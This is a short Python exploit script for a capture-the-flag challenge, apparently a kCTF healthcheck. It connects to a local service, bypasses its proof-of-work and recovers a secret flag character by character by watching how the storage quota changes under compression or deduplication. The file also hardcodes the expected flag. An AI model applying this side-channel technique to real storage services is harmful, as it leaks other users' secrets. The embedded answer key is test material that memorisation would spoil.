#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib
from pwn import *

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
print(r.recvuntil('== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)

charset = string.ascii_letters + string.digits + "{}_"

r.sendline("store")
r.sendline("#"*16 + "X")
r.recvuntil("Stored")

def getquota():
    r.sendline("status")
    r.recvuntil("Quota:")
    s = r.recvline()
    return float(s.strip().split(b"kB")[0].decode())

quota = getquota()
flag = ""
while True:
    good = False
    for ch in charset:
        r.sendline("store")
        r.sendline(ch + flag + "#" * 16)
        r.recvuntil("Stored")
        q2 = getquota()
        diff = q2 - quota
        quota = q2
        if diff < 0.008:
            flag = ch + flag
            print(flag)
            good = True
            break
    if not good:
        break


if flag == "CTF{CR1M3_0f_d3dup1ic4ti0n}":
    exit(0)
else:
    exit(1)
